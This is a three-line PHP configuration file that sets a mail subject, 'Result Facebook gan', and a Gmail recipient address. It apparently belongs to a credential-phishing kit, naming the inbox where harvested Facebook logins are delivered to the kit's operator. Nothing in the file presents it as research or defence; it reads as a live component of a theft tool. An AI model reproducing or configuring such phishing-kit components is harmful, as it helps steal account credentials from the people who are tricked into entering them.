<?php
$subjek = 'Result Facebook gan';
$mailto = 'ensikology@gmail.com';
?>